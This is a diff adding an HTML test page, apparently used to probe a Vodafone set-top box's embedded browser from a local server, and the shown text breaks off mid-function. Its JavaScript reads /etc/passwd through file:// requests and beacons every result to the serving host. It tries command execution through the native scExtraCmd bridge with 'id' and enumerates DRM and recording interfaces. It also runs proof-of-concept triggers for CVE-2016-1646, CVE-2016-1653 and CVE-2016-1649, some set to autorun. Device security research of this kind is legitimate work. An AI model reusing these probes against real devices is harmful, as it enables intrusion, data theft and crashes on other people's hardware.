@@ -1,0 +1,961 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Vodafone Box Test Page</title>
+  <style>
+    body { margin: 0; background: #101820; color: #fff; font-family: Arial, sans-serif; }
+    main { padding: 70px; }
+    h1 { color: #e60000; font-size: 52px; margin: 0 0 24px; }
+    p { font-size: 28px; line-height: 1.45; }
+    .ok { display: inline-block; padding: 14px 24px; background: #e60000; border-radius: 8px; }
+    a { display: block; margin: 18px 0; padding: 18px 24px; width: 520px;
+        background: #263746; color: #fff; font-size: 26px; text-decoration: none; }
+    a:focus { outline: 6px solid #e60000; background: #39536a; }
+    button { margin: 18px 0; padding: 18px 24px; background: #e60000; color: #fff;
+             border: 0; font-size: 26px; }
+    button:focus { outline: 6px solid #fff; }
+    pre { white-space: pre-wrap; background: #000; padding: 20px; font-size: 18px; }
+  </style>
+</head>
+<body>
+  <main>
+    <h1>Custom page loaded</h1>
+    <p class="ok">Netflix Help redirect worked.</p>
+    <p>This page is being served by 192.168.0.163.</p>
+    <p>Read-only local file tests:</p>
+    <button type="button" onclick="runFileTests()">Run JavaScript file tests</button>
+    <button type="button" onclick="inspectBridges()">Inspect native bridges</button>
+    <button type="button" onclick="inspectOipfObjects()">Inspect safe OIPF objects</button>
+    <button type="button" onclick="inspectOipfNested()">Inspect nested OIPF data</button>
+    <button type="button" onclick="testScExtraCmd()">Test scExtraCmd with id</button>
+    <button type="button" onclick="inspectHardwareCollections()">Inspect interfaces and outputs</button>
+    <button type="button" onclick="inspectApplicationAndCapabilities()">Inspect app and capabilities</button>
+    <button type="button" onclick="fingerprintBrowser()">Fingerprint browser engine</button>
+    <button type="button" onclick="probeCve20161646()">Probe CVE-2016-1646 (may restart UI)</button>
+    <button type="button" onclick="probeCve20161653()">Probe CVE-2016-1653 (crash test)</button>
+    <button type="button" onclick="probeExactV8Regressions()">Run browser-adapted V8 regression probes</button>
+    <button type="button" onclick="probeConcatIsolated()">Run isolated CVE-2016-1646 concat test</button>
+    <button type="button" onclick="probeAngle1649()">Run isolated CVE-2016-1649 WebGL test</button>
+    <button type="button" onclick="probeAngle1649Exact()">Run crash-oriented CVE-2016-1649 WebGL2 regression</button>
+    <button type="button" onclick="deepInspectOipf()">Deep-inspect OIPF bridge</button>
+    <button type="button" onclick="probeScExtraCmdHelp()">Probe scExtraCmd help</button>
+    <button type="button" onclick="probeScExtraCmdEvents()">Listen for scExtraCmd events</button>
+    <button type="button" onclick="probeScExtraCmdShapes()">Probe scExtraCmd argument shapes</button>
+    <button type="button" onclick="discoverRecordingCommands()">Discover read-only recording commands</button>
+    <pre id="results">No JavaScript test run yet.</pre>
+  </main>
+  <script>
+    function show(message) {
+      document.getElementById('results').textContent += message + '\n';
+      var beacon = new Image();
+      beacon.src = '/report?message=' + encodeURIComponent(message) + '&t=' + new Date().getTime();
+    }
+
+    function testFile(path) {
+      var xhr = new XMLHttpRequest();
+      try {
+        xhr.open('GET', 'file://' + path, true);
+        xhr.onreadystatechange = function () {
+          if (xhr.readyState === 4) {
+            show(path + ': status=' + xhr.status + ', bytes=' + (xhr.responseText || '').length);
+            if (xhr.responseText) {
+              show(xhr.responseText.substring(0, 2000));
+            }
+          }
+        };
+        xhr.onerror = function () { show(path + ': blocked or failed'); };
+        xhr.send(null);
+      } catch (error) {
+        show(path + ': exception: ' + error);
+      }
+    }
+
+    function runFileTests() {
+      document.getElementById('results').textContent = '';
+      testFile('/etc/passwd');
+      testFile('/proc/cpuinfo');
+    }
+
+    function describe(name) {
+      var value;
+      try {
+        value = window[name];
+        if (typeof value === 'undefined' || value === null) {
+          show(name + ': absent');
+          return;
+        }
+        var properties = [];
+        for (var key in value) {
+          try { properties.push(key + ':' + typeof value[key]); } catch (ignore) {}
+          if (properties.length >= 80) { break; }
+        }
+        show(name + ': ' + typeof value + ' [' + properties.join(',') + ']');
+      } catch (error) {
+        show(name + ': exception: ' + error);
+      }
+    }
+
+    function inspectBridges() {
+      document.getElementById('results').textContent = '';
+      var names = ['Global', 'opera', 'oipfObjectFactory', 'oipfApplicationManager',
+                   'webapis', 'nrdp', 'webkit', 'PalmSystem', 'HbbTV',
+                   'Sagemcom', 'STB', 'device', 'bridge'];
+      for (var i = 0; i < names.length; i++) { describe(names[i]); }
+    }
+
+    function describeValue(label, value) {
+      try {
+        if (value === null || typeof value === 'undefined') {
+          show(label + ': ' + value);
+          return;
+        }
+        var properties = [];
+        for (var key in value) {
+          var kind = 'unknown';
+          try { kind = typeof value[key]; } catch (ignore) {}
+          properties.push(key + ':' + kind);
+          if (properties.length >= 120) { break; }
+        }
+        show(label + ': ' + typeof value + ' [' + properties.join(',') + ']');
+      } catch (error) {
+        show(label + ': exception: ' + error);
+      }
+    }
+
+    function inspectOipfObjects() {
+      document.getElementById('results').textContent = '';
+      var tests = [
+        ['capabilities', 'createCapabilitiesObject'],
+        ['configuration', 'createConfigurationObject'],
+        ['gateway', 'createGatewayInfoObject'],
+        ['applicationManager', 'createApplicationManagerObject']
+      ];
+      for (var i = 0; i < tests.length; i++) {
+        try {
+          describeValue(tests[i][0], oipfObjectFactory[tests[i][1]]());
+        } catch (error) {
+          show(tests[i][0] + ': exception: ' + error);
+        }
+      }
+    }
+
+    function collectNested(label, value, depth, seen) {
+      if (depth > 2 || value === null || typeof value === 'undefined') { return; }
+      var kind = typeof value;
+      if (kind !== 'object') {
+        if (kind !== 'function') { show(label + '=' + String(value).substring(0, 500)); }
+        return;
+      }
+      for (var i = 0; i < seen.length; i++) { if (seen[i] === value) { return; } }
+      seen.push(value);
+      var count = 0;
+      for (var key in value) {
+        if (++count > 100) { show(label + ': property limit reached'); break; }
+        try {
+          var child = value[key];
+          if (typeof child === 'function') {
+            show(label + '.' + key + ':function');
+          } else if (typeof child === 'object' && child !== null) {
+            show(label + '.' + key + ':object');
+            collectNested(label + '.' + key, child, depth + 1, seen);
+          } else {
+            show(label + '.' + key + '=' + String(child).substring(0, 500));
+          }
+        } catch (error) {
+          show(label + '.' + key + ': exception: ' + error);
+        }
+      }
+    }
+
+    function reportChunks(label, text) {
+      text = String(text || '');
+      show(label + ': length=' + text.length);
+      for (var i = 0; i < text.length && i < 6000; i += 700) {
+        show(label + '[' + i + ']=' + text.substring(i, i + 700));
+      }
+    }
+
+    function inspectOipfNested() {
+      document.getElementById('results').textContent = '';
+      try {
+        var configObject = oipfObjectFactory.createConfigurationObject();
+        collectNested('configuration', configObject.configuration, 0, []);
+        collectNested('localSystem', configObject.localSystem, 0, []);
+      } catch (error) { show('configuration inspection exception: ' + error); }
+      try {
+        var capabilities = oipfObjectFactory.createCapabilitiesObject();
+        var xml = capabilities.xmlCapabilities;
+        if (typeof XMLSerializer !== 'undefined' && xml) {
+          reportChunks('xmlCapabilities', new XMLSerializer().serializeToString(xml));
+        } else {
+          collectNested('xmlCapabilities', xml, 0, []);
+        }
+      } catch (error) { show('capabilities inspection exception: ' + error); }
+    }
+
+    function testScExtraCmd() {
+      document.getElementById('results').textContent = '';
+      try {
+        var configObject = oipfObjectFactory.createConfigurationObject();
+        var command = configObject.configuration.scExtraCmd;
+        show('scExtraCmd type=' + typeof command + ', arity=' + command.length);
+        var result = command.call(configObject.configuration, 'id');
+        show('scExtraCmd("id") return type=' + typeof result);
+        show('scExtraCmd("id") result=' + String(result).substring(0, 2000));
+      } catch (error) {
+        show('scExtraCmd("id") exception=' + error);
+      }
+    }
+
+    function inspectCollection(label, collection) {
+      try {
+        show(label + '.length=' + collection.length);
+        for (var i = 0; i < collection.length; i++) {
+          var item = collection.item(i);
+          describeValue(label + '[' + i + ']', item);
+          collectNested(label + '[' + i + ']', item, 0, []);
+        }
+      } catch (error) {
+        show(label + ': exception: ' + error);
+      }
+    }
+
+    function inspectHardwareCollections() {
+      document.getElementById('results').textContent = '';
+      try {
+        var localSystem = oipfObjectFactory.createConfigurationObject().localSystem;
+        inspectCollection('networkInterfaces', localSystem.networkInterfaces);
+        inspectCollection('outputs', localSystem.outputs);
+        inspectCollection('tuners', localSystem.tuners);
+      } catch (error) {
+        show('hardware collection inspection exception: ' + error);
+      }
+    }
+
+    function inspectApplicationAndCapabilities() {
+      document.getElementById('results').textContent = '';
+      try {
+        var manager = oipfObjectFactory.createApplicationManagerObject();
+        var owner = manager.getOwnerApplication(document);
+        describeValue('ownerApplication', owner);
+        collectNested('ownerApplication', owner, 0, []);
+        var children = manager.getChildApplications(owner);
+        if (children) { inspectCollection('childApplications', children); }
+        else { show('childApplications: null'); }
+      } catch (error) { show('application inspection exception: ' + error); }
+
+      try {
+        var capabilities = oipfObjectFactory.createCapabilitiesObject();
+        var xml = capabilities.xmlCapabilities;
+        show('xmlCapabilities typeof=' + typeof xml);
+        show('xmlCapabilities String=' + String(xml).substring(0, 2000));
+        if (xml && xml.documentElement) {
+          show('xmlCapabilities root=' + xml.documentElement.nodeName);
+          reportChunks('xmlCapabilities.outerHTML', xml.documentElement.outerHTML || '');
+          reportChunks('xmlCapabilities.textContent', xml.documentElement.textContent || '');
+        }
+      } catch (error) { show('raw capabilities exception: ' + error); }
+
+      var objectTypes = [
+        'application/oipfApplicationManager', 'application/oipfCapabilities',
+        'application/oipfConfiguration', 'application/oipfDownloadManager',
+        'application/oipfDrmAgent', 'application/oipfParentalControlManager',
+        'application/oipfRecordingScheduler', 'application/oipfSearchManager',
+        'video/broadcast', 'video/mpeg'
+      ];
+      for (var i = 0; i < objectTypes.length; i++) {
+        try { show('supported ' + objectTypes[i] + '=' + oipfObjectFactory.isObjectSupported(objectTypes[i])); }
+        catch (error) { show('supported ' + objectTypes[i] + ': exception: ' + error); }
+      }
+    }
+
+    function fingerprintBrowser() {
+      document.getElementById('results').textContent = '';
+      var fields = ['userAgent', 'appVersion', 'platform', 'vendor', 'product',
+                    'productSub', 'buildID', 'oscpu', 'language', 'hardwareConcurrency'];
+      for (var i = 0; i < fields.length; i++) {
+        try { show('navigator.' + fields[i] + '=' + String(navigator[fields[i]])); }
+        catch (error) { show('navigator.' + fields[i] + ': exception=' + error); }
+      }
+      var probes = [
+        ['WebAssembly', function () { return typeof WebAssembly; }],
+        ['SharedArrayBuffer', function () { return typeof SharedArrayBuffer; }],
+        ['BigInt', function () { return typeof BigInt; }],
+        ['Proxy', function () { return typeof Proxy; }],
+        ['Reflect', function () { return typeof Reflect; }],
+        ['Symbol', function () { return typeof Symbol; }],
+        ['Promise', function () { return typeof Promise; }],
+        ['Map', function () { return typeof Map; }],
+        ['Uint8Array', function () { return typeof Uint8Array; }],
+        ['ArrayBuffer.transfer', function () { return typeof ArrayBuffer.transfer; }],
+        ['Object.values', function () { return typeof Object.values; }],
+        ['padStart', function () { return typeof String.prototype.padStart; }],
+        ['async syntax', function () { return Function('async function f(){}') && 'accepted'; }],
+        ['class syntax', function () { return Function('class X {}') && 'accepted'; }],
+        ['spread syntax', function () { return Function('return Math.max(...[1,2])')() === 2; }]
+      ];
+      for (var j = 0; j < probes.length; j++) {
+        try { show('feature.' + probes[j][0] + '=' + String(probes[j][1]())); }
+        catch (error) { show('feature.' + probes[j][0] + '=rejected (' + error.name + ')'); }
+      }
+      try {
+        var canvas = document.createElement('canvas');
+        var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        show('webgl=' + Boolean(gl));
+        if (gl) {
+          show('webgl.version=' + gl.getParameter(gl.VERSION));
+          show('webgl.renderer=' + gl.getParameter(gl.RENDERER));
+        }
+      } catch (error) { show('webgl exception=' + error); }
+      show('fingerprint.complete=true');
+    }
+
+    function probeCve20161646() {
+      document.getElementById('results').textContent = '';
+      show('CVE-2016-1646 probe.start');
+      var pressure = [];
+      try {
+        var target = new Array(10);
+        target[0] = 0.1;
+        target[2] = 2.1;
+        target[3] = 3.1;
+        var proto = {};
+        target.__proto__ = proto;
+        Object.defineProperty(proto, 1, {
+          configurable: true,
+          get: function () {
+            target.length = 1;
+            /* Bounded pressure to encourage a normal browser GC. */
+            for (var i = 0; i < 48; i++) {
+              pressure.push(new Uint8Array(1024 * 1024));
+            }
+            return 2.2;
+          },
+          set: function () {}
+        });
+        var result = Array.prototype.concat.call(target);
+        var v2 = result[2];
+        var v3 = result[3];
+        show('CVE-2016-1646 result.length=' + result.length);
+        show('CVE-2016-1646 result[0..3]=' + String(result[0]) + ',' +
+             String(result[1]) + ',' + String(v2) + ',' + String(v3));
+        if (typeof v2 !== 'undefined' || typeof v3 !== 'undefined') {
+          show('CVE-2016-1646 verdict=VULNERABLE_OR_MEMORY_DISCLOSURE');
+        } else {
+          show('CVE-2016-1646 verdict=NOT_REPRODUCED');
+        }
+      } catch (error) {
+        show('CVE-2016-1646 exception=' + error.name + ':' + error.message);
+      }
+      pressure = null;
+      show('CVE-2016-1646 probe.complete');
+    }
+
+    function probeCve20161653() {
+      document.getElementById('results').textContent = '';
+      show('CVE-2016-1653 probe.start');
+      try {
+        var heap = new ArrayBuffer(256);
+        var before = new Uint32Array(heap)[0];
+        var boom = (function (stdlib, foreign, asmHeap) {
+          'use asm';
+          var Uint8ArrayView = new stdlib.Uint8Array(asmHeap);
+          var Int32ArrayView = new stdlib.Int32Array(asmHeap);
+          function f(i, i1) {
+            i1 = Uint8ArrayView[256];
+            Int32ArrayView[i1 >> 10] = 0xabcdefaa;
+            return (-i1 + (Int32ArrayView[i1 >> 2]));
+          }
+          return f;
+        })(this, 0, heap);
+        var last = 0;
+        for (var i = 0; i < 400; ++i) {
+          last = boom(0, 0x1000);
+        }
+        var after = new Uint32Array(heap)[0];
+        show('CVE-2016-1653 returned=' + last + ', word0.before=' + before +
+             ', word0.after=' + after);
+        show('CVE-2016-1653 verdict=NO_CRASH_OR_OOB_OBSERVED');
+      } catch (error) {
+        show('CVE-2016-1653 exception=' + error.name + ':' + error.message);
+      }
+      show('CVE-2016-1653 probe.complete');
+    }
+
+    function probeExactV8Regressions() {
+      document.getElementById('results').textContent = '';
+      show('V8 exact-regression probe.start; ua=' + navigator.userAgent);
+
+      function allocationPressure() {
+        var pressure = [];
+        for (var i = 0; i < 96; i++) {
+          pressure.push(new Uint32Array(65536));
+          pressure[i][0] = i;
+        }
+        return pressure;
+      }
+
+      function concatCase(useDefaultPrototype, iteration) {
+        var array = new Array(10);
+        array[0] = 0.1;
+        array[2] = 2.1;
+        array[3] = 3.1;
+        var copy = array.slice(0, array.length);
+        var proto = useDefaultPrototype ? array.__proto__ : {};
+        var previous = Object.getOwnPropertyDescriptor(proto, '1');
+        if (!useDefaultPrototype) array.__proto__ = proto;
+        Object.defineProperty(proto, '1', {
+          configurable: true,
+          get: function () {
+            array.length = 1;
+            allocationPressure();
+            return 'value from proto';
+          },
+          set: function () {}
+        });
+        var result;
+        try {
+          result = Array.prototype.concat.call(array);
+        } finally {
+          if (previous) Object.defineProperty(proto, '1', previous);
+          else delete proto[1];
+        }
+        var anomalous = typeof result[2] !== 'undefined' || typeof result[3] !== 'undefined';
+        if (anomalous || iteration === 0) {
+          show('CVE-2016-1646 exact variant=' + (useDefaultPrototype ? 'default' : 'custom') +
+               ';iteration=' + iteration + ';length=' + result.length +
+               ';v0=' + String(result[0]) + ';v1=' + String(result[1]) +
+               ';v2=' + String(result[2]) + ';v3=' + String(result[3]) +
+               ';anomalous=' + anomalous + ';copy=' + copy.length);
+        }
+        return anomalous;
+      }
+
+      var concatAnomalies = 0;
+      try {
+        for (var c = 0; c < 40; c++) {
+          if (concatCase(false, c)) concatAnomalies++;
+          if (concatCase(true, c)) concatAnomalies++;
+        }
+        show('CVE-2016-1646 exact.complete;cases=80;anomalies=' + concatAnomalies);
+      } catch (concatError) {
+        show('CVE-2016-1646 exact.THROW=' + concatError.name + ':' + concatError.message);
+      }
+
+      try {
+        var heap = new ArrayBuffer(65536);
+        var loadBuffer = (function (stdlib, foreign, asmHeap) {
+          'use asm';
+          var mem8 = new stdlib.Uint8Array(asmHeap);
+          var mem32 = new stdlib.Int32Array(asmHeap);
+          function probe(i) {
+            i = i | 0;
+            var j = 0;
+            j = mem8[65536] | 0;
+            mem32[j >> 10] = 0xabcdefaa;
+            return (mem32[j >> 2] + j) | 0;
+          }
+          return probe;
+        })(this, 0, heap);
+        var observed = {}, last = 0;
+        for (var w = 0; w < 100000; w++) {
+          last = loadBuffer(w | 0) | 0;
+          observed[String(last)] = (observed[String(last)] || 0) + 1;
+        }
+        show('CVE-2016-1653 exact.complete;iterations=100000;last=' + last +
+             ';word0=' + new Uint32Array(heap)[0] +
+             ';returns=' + JSON.stringify(observed));
+      } catch (loadError) {
+        show('CVE-2016-1653 exact.THROW=' + loadError.name + ':' + loadError.message);
+      }
+      show('V8 exact-regression probe.complete');
+    }
+
+    function probeConcatIsolated() {
+      document.getElementById('results').textContent = '';
+      show('concatIsolate START');
+
+      function pressureWithoutArrays() {
+        var holder = {};
+        for (var i = 0; i < 128; i++) {
+          holder['buffer' + i] = new Uint32Array(65536);
+          holder['buffer' + i][0] = i;
+        }
+        return holder;
+      }
+
+      function execute(label, useDefaultPrototype) {
+        show('concatIsolate BEFORE variant=' + label);
+        var source = new Array(10);
+        source[0] = 0.1;
+        source[2] = 2.1;
+        source[3] = 3.1;
+        var proto = useDefaultPrototype ? Array.prototype : {};
+        var prior = Object.getOwnPropertyDescriptor(proto, '1');
+        var getterCalls = 0;
+        if (!useDefaultPrototype) source.__proto__ = proto;
+        Object.defineProperty(proto, '1', {
+          configurable: true,
+          get: function () {
+            getterCalls++;
+            source.length = 1;
+            pressureWithoutArrays();
+            return 'value from proto';
+          },
+          set: function () {}
+        });
+        var result, thrown = null;
+        try {
+          result = Array.prototype.concat.call(source);
+        } catch (error) {
+          thrown = error;
+        } finally {
+          if (prior) Object.defineProperty(proto, '1', prior);
+          else delete proto[1];
+        }
+        if (thrown) {
+          show('concatIsolate THROW variant=' + label + ';getterCalls=' + getterCalls +
+               ';error=' + thrown.name + ':' + thrown.message);
+          return;
+        }
+        show('concatIsolate AFTER variant=' + label + ';getterCalls=' + getterCalls +
+             ';length=' + result.length + ';v0=' + String(result[0]) +
+             ';v1=' + String(result[1]) + ';v2=' + String(result[2]) +
+             ';v3=' + String(result[3]) + ';anomalous=' +
+             (typeof result[2] !== 'undefined' || typeof result[3] !== 'undefined'));
+      }
+
+      try { execute('custom', false); }
+      catch (customError) { show('concatIsolate OUTER_THROW variant=custom;error=' + customError); }
+      setTimeout(function () {
+        try { execute('default', true); }
+        catch (defaultError) { show('concatIsolate OUTER_THROW variant=default;error=' + defaultError); }
+        show('concatIsolate COMPLETE');
+      }, 1500);
+    }
+
+    function probeAngle1649() {
+      document.getElementById('results').textContent = '';
+      show('ANGLE1649 START;ua=' + navigator.userAgent);
+      var canvas = document.createElement('canvas');
+      canvas.width = 32;
+      canvas.height = 32;
+      canvas.addEventListener('webglcontextlost', function (event) {
+        event.preventDefault();
+        show('ANGLE1649 CONTEXT_LOST status=' + String(event.statusMessage));
+      }, false);
+      canvas.addEventListener('webglcontextrestored', function () {
+        show('ANGLE1649 CONTEXT_RESTORED');
+      }, false);
+      document.body.appendChild(canvas);
+      var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+      if (!gl) {
+        show('ANGLE1649 NO_WEBGL');
+        return;
+      }
+      show('ANGLE1649 context=' + gl.getParameter(gl.VERSION) +
+           ';vendor=' + gl.getParameter(gl.VENDOR) +
+           ';renderer=' + gl.getParameter(gl.RENDERER));
+      function shader(type, source) {
+        var object = gl.createShader(type);
+        gl.shaderSource(object, source);
+        gl.compileShader(object);
+        if (!gl.getShaderParameter(object, gl.COMPILE_STATUS)) {
+          throw new Error('shader:' + gl.getShaderInfoLog(object));
+        }
+        return object;
+      }
+      try {
+        var vertexSource =
+          'attribute vec4 position;\n' +
+          'uniform float uf[4];\n' +
+          'uniform vec2 uv2[4];\n' +
+          'uniform vec3 uv3[4];\n' +
+          'uniform vec4 uv4[4];\n' +
+          'uniform int ui[4];\n' +
+          'void main(){\n' +
+          ' float s=uf[0]+uf[1]+uf[2]+uf[3]+\n' +
+          ' uv2[0].x+uv2[1].y+uv2[2].x+uv2[3].y+\n' +
+          ' uv3[0].x+uv3[1].y+uv3[2].z+uv3[3].x+\n' +
+          ' uv4[0].x+uv4[1].y+uv4[2].z+uv4[3].w+\n' +
+          ' float(ui[0]+ui[1]+ui[2]+ui[3]);\n' +
+          ' gl_Position=position+vec4(s*0.000001);\n' +
+          '}';
+        var fragmentSource =
+          'precision mediump float;\n' +
+          'void main(){gl_FragColor=vec4(1.0,0.0,0.0,1.0);}';
+        var program = gl.createProgram();
+        gl.attachShader(program, shader(gl.VERTEX_SHADER, vertexSource));
+        gl.attachShader(program, shader(gl.FRAGMENT_SHADER, fragmentSource));
+        gl.linkProgram(program);
+        if (!gl.getProgramParameter(program, gl.LINK_STATUS)) {
+          throw new Error('link:' + gl.getProgramInfoLog(program));
+        }
+        gl.useProgram(program);
+        var uniforms = [
+          ['uf', 1, [1,2,3,4]], ['uv2', 2, [1,2,3,4,5,6,7,8]],
+          ['uv3', 3, [1,2,3,4,5,6,7,8,9,10,11,12]],
+          ['uv4', 4, [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16]]
+        ];
+        for (var u = 0; u < uniforms.length; u++) {
+          var base = gl.getUniformLocation(program, uniforms[u][0] + '[0]');
+          gl['uniform' + uniforms[u][1] + 'fv'](base, new Float32Array(uniforms[u][2]));
+        }
+        gl.uniform1iv(gl.getUniformLocation(program, 'ui[0]'), new Int32Array([1,2,3,4]));
+        var names = ['uf','uv2','uv3','uv4','ui'];
+        for (var n = 0; n < names.length; n++) {
+          for (var index = 0; index < 4; index++) {
+            var testName = names[n] + '[' + index + ']';
+            var location = gl.getUniformLocation(program, testName);
+            show('ANGLE1649 BEFORE getUniform name=' + testName + ';location=' + String(location));
+            var value = gl.getUniform(program, location);
+            var rendered;
+            try { rendered = value && typeof value.length === 'number' ? Array.prototype.join.call(value, ',') : String(value); }
+            catch (stringError) { rendered = 'STRING_THROW:' + stringError; }
+            show('ANGLE1649 AFTER getUniform name=' + testName + ';type=' +
+                 Object.prototype.toString.call(value) + ';value=' + rendered +
+                 ';error=' + gl.getError());
+          }
+        }
+        gl.finish();
+        show('ANGLE1649 COMPLETE;error=' + gl.getError() +
+             ';lost=' + (gl.isContextLost ? gl.isContextLost() : 'unsupported'));
+      } catch (error) {
+        show('ANGLE1649 THROW=' + error.name + ':' + error.message +
+             ';glError=' + gl.getError());
+      }
+    }
+
+    function probeAngle1649Exact() {
+      document.getElementById('results').textContent = '';
+      show('ANGLE1649EXACT START;ua=' + navigator.userAgent);
+      var canvas = document.createElement('canvas');
+      canvas.width = 16;
+      canvas.height = 16;
+      canvas.addEventListener('webglcontextlost', function (event) {
+        show('ANGLE1649EXACT CONTEXT_LOST status=' + String(event.statusMessage));
+      }, false);
+      document.body.appendChild(canvas);
+      var gl = canvas.getContext('webgl2') || canvas.getContext('experimental-webgl2');
+      if (!gl) {
+        show('ANGLE1649EXACT WEBGL2_UNAVAILABLE;exact ES3/uvec4 path is not web-reachable');
+        show('ANGLE1649EXACT COMPLETE unavailable=true');
+        return;
+      }
+      show('ANGLE1649EXACT context=' + gl.getParameter(gl.VERSION) +
+           ';vendor=' + gl.getParameter(gl.VENDOR) + ';renderer=' + gl.getParameter(gl.RENDERER));
+      function compile(type, source) {
+        var shaderObject = gl.createShader(type);
+        gl.shaderSource(shaderObject, source);
+        gl.compileShader(shaderObject);
+        if (!gl.getShaderParameter(shaderObject, gl.COMPILE_STATUS)) {
+          throw new Error('compile:' + gl.getShaderInfoLog(shaderObject));
+        }
+        return shaderObject;
+      }
+      try {
+        var vertex = '#version 300 es\n' +
+          'uniform bool uBool[4];\n' +
+          'uniform vec2 uFloat[4];\n' +
+          'uniform ivec3 uInt[4];\n' +
+          'uniform uvec4 uUint[4];\n' +
+          'void main(){float s=0.0;\n' +
+          's+=float(uBool[0])+float(uBool[1])+float(uBool[2])+float(uBool[3]);\n' +
+          's+=uFloat[0].x+uFloat[1].y+uFloat[2].x+uFloat[3].y;\n' +
+          's+=float(uInt[0].x+uInt[1].y+uInt[2].z+uInt[3].x);\n' +
+          's+=float(uUint[0].x+uUint[1].y+uUint[2].z+uUint[3].w);\n' +
+          'gl_Position=vec4(1.0+s*0.000001);}\n';
+        var fragment = '#version 300 es\nprecision mediump float;\n' +
+          'out vec4 color;void main(){color=vec4(1,0,0,1);}\n';
+        var program = gl.createProgram();
+        gl.attachShader(program, compile(gl.VERTEX_SHADER, vertex));
+        gl.attachShader(program, compile(gl.FRAGMENT_SHADER, fragment));
+        gl.linkProgram(program);
+        if (!gl.getProgramParameter(program, gl.LINK_STATUS)) {
+          throw new Error('link:' + gl.getProgramInfoLog(program));
+        }
+        gl.useProgram(program);
+        gl.uniform1iv(gl.getUniformLocation(program, 'uBool[0]'), new Int32Array([1,0,1,0]));
+        gl.uniform2fv(gl.getUniformLocation(program, 'uFloat[0]'), new Float32Array([1,2,3,4,5,6,7,8]));
+        gl.uniform3iv(gl.getUniformLocation(program, 'uInt[0]'), new Int32Array([1,2,3,4,5,6,7,8,9,10,11,12]));
+        gl.uniform4uiv(gl.getUniformLocation(program, 'uUint[0]'), new Uint32Array([1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16]));
+        var exactNames = ['uBool','uFloat','uInt','uUint'];
+        var checksum = 0;
+        for (var round = 0; round < 2000; round++) {
+          for (var en = 0; en < exactNames.length; en++) {
+            for (var ei = 0; ei < 4; ei++) {
+              var uniformName = exactNames[en] + '[' + ei + ']';
+              if (round === 0 || round === 1999) {
+                show('ANGLE1649EXACT BEFORE round=' + round + ';name=' + uniformName);
+              }
+              var uniformValue = gl.getUniform(program, gl.getUniformLocation(program, uniformName));
+              if (typeof uniformValue === 'number' || typeof uniformValue === 'boolean') {
+                checksum += Number(uniformValue);
+              } else if (uniformValue && uniformValue.length) {
+                for (var vi = 0; vi < uniformValue.length; vi++) checksum += Number(uniformValue[vi]);
+              }
+              if (round === 0 || round === 1999) {
+                show('ANGLE1649EXACT AFTER round=' + round + ';name=' + uniformName +
+                     ';type=' + Object.prototype.toString.call(uniformValue) +
+                     ';length=' + (uniformValue && uniformValue.length) + ';error=' + gl.getError());
+              }
+            }
+          }
+        }
+        gl.finish();
+        show('ANGLE1649EXACT COMPLETE rounds=2000;calls=32000;checksum=' + checksum +
+             ';error=' + gl.getError() + ';lost=' + gl.isContextLost());
+      } catch (error) {
+        show('ANGLE1649EXACT THROW=' + error.name + ':' + error.message + ';glError=' + gl.getError());
+      }
+    }
+
+    if (location.search.indexOf('autorun=v8') !== -1) {
+      setTimeout(probeExactV8Regressions, 1000);
+    }
+    if (location.search.indexOf('autorun=concat-isolate') !== -1) {
+      setTimeout(probeConcatIsolated, 1000);
+    }
+    if (location.search === '?autorun=angle1649') {
+      setTimeout(probeAngle1649, 1000);
+    }
+    if (location.search.indexOf('autorun=angle1649-exact') !== -1) {
+      setTimeout(probeAngle1649Exact, 1000);
+    }
+    if (location.search.indexOf('autorun=fingerprint') !== -1) {
+      setTimeout(fingerprintBrowser, 1000);
+    }
+
+    function inspectPrototypeChain(label, value) {
+      var current = value;
+      for (var depth = 0; current && depth < 6; depth++) {
+        try {
+          var names = Object.getOwnPropertyNames(current);
+          show(label + '.prototype[' + depth + ']=' + names.join(','));
+          for (var i = 0; i < names.length && i < 100; i++) {
+            try {
+              var descriptor = Object.getOwnPropertyDescriptor(current, names[i]);
+              if (descriptor) {
+                show(label + '.' + names[i] + '.descriptor=' +
+                     (descriptor.get ? 'get;' : '') + (descriptor.set ? 'set;' : '') +
+                     (typeof descriptor.value === 'function' ?
+                       'function/' + descriptor.value.length : typeof descriptor.value));
+              }
+            } catch (ignoreDescriptor) {}
+          }
+          current = Object.getPrototypeOf(current);
+        } catch (error) {
+          show(label + '.prototype[' + depth + '] exception=' + error);
+          break;
+        }
+      }
+    }
+
+    function deepInspectOipf() {
+      document.getElementById('results').textContent = '';
+      var objects = [];
+      try { objects.push(['factory', oipfObjectFactory]); } catch (ignore0) {}
+      try { objects.push(['configurationObject', oipfObjectFactory.createConfigurationObject()]); } catch (ignore1) {}
+      try { objects.push(['configuration', objects[1][1].configuration]); } catch (ignore2) {}
+      try { objects.push(['localSystem', objects[1][1].localSystem]); } catch (ignore3) {}
+      try { objects.push(['applicationManager', oipfObjectFactory.createApplicationManagerObject()]); } catch (ignore4) {}
+      try { objects.push(['capabilities', oipfObjectFactory.createCapabilitiesObject()]); } catch (ignore5) {}
+      try { objects.push(['drmAgent', oipfObjectFactory.createDrmAgentObject()]); } catch (ignore6) {}
+      try { objects.push(['parentalControl', oipfObjectFactory.createParentalControlManagerObject()]); } catch (ignore7) {}
+      try { objects.push(['recordingScheduler', oipfObjectFactory.createRecordingSchedulerObject()]); } catch (ignore8) {}
+      try { objects.push(['searchManager', oipfObjectFactory.createSearchManagerObject()]); } catch (ignore9) {}
+      for (var i = 0; i < objects.length; i++) {
+        inspectPrototypeChain(objects[i][0], objects[i][1]);
+      }
+      show('OIPF deep inspection complete; objects=' + objects.length);
+    }
+
+    function probeScExtraCmdHelp() {
+      document.getElementById('results').textContent = '';
+      try {
+        var configuration = oipfObjectFactory.createConfigurationObject().configuration;
+        var queries = ['help', '?', 'version', 'echo OIPF_TEST'];
+        for (var i = 0; i < queries.length; i++) {
+          try {
+            var result = configuration.scExtraCmd(queries[i]);
+            show('scExtraCmd(' + queries[i] + ') type=' + typeof result +
+                 ' value=' + String(result).substring(0, 2000));
+          } catch (error) {
+            show('scExtraCmd(' + queries[i] + ') exception=' + error);
+          }
+        }
+      } catch (error) { show('scExtraCmd discovery exception=' + error); }
+      show('scExtraCmd discovery complete');
+    }
+
+    function reportNativeEvent(prefix, event) {
